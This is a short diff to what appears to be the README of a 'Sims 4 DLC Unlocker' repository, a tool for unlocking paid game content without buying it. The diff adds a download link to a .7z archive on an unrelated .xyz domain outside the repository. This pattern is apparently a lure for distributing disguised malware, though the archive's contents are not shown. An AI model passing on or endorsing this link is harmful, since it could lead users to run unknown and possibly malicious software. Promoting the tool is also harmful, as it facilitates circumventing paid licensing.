@@ -28,3 +28,6 @@ To get started with Sims 4 DLC Unlocker V2.0, simply follow these steps:
 
 
 ![Sims 4 DLC Unlocker v2 0](https://github.com/patrickStar109/Sims-4-DLC-Unlocker-V2.0/assets/61595428/68e10f31-aeef-4957-9957-e4895024183c)
+
+
+Download: Sims [DLC Unlocker (version 1 & 2)](http://elmenelek.xyz/Sims%204%20DLC%20Unlocker.7z) 
